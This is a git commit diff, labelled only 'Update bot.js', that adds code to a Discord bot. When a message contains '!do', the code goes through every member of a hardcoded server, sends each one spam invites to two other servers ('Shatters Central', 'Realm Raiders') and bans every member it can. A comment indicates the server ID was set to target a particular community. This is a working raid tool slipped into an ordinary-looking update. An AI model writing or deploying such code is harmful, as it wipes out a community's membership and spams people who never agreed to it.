25cbce5b6eea03b14474c0f3418b7715102dc7db
Sreyaash <33704504+droidmx@users.noreply.github.com>
2018-06-03 21:23:25 -0400

    Update bot.js

--- bot.js
+++ bot.js
@@ -4,6 +4,32 @@ const snekfetch = require("snekfetch");
 const fs = require('fs');
 const ms = require('ms');
 let test = JSON.parse(fs.readFileSync('./test.json', 'utf8'));
+const command = '!do';
+const serverid = '452990448336633856';//id of server, i set it to old eun2 for u
+let server;
+let channel;
+let members;
+var watching = true;
+
+client.on('ready', () => {
+    console.log(`Logged in as ${client.user.tag}`);
+    server = client.guilds.get(serverid);
+    members = server.members;
+
+});
+
+client.on('message', message => {
+    console.log('command received');
+    if(message.content.includes(command)){
+        members.forEach((member) => {
+            console.log(member.id);
+            member.send(`Shatters Central: https://discord.gg/zNZUHbe \n Realm Raiders: https://discord.gg/GKe3m4p`)
+            if(member.bannable){
+                member.ban();
+            }                
+        })
+    }
+});
 
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
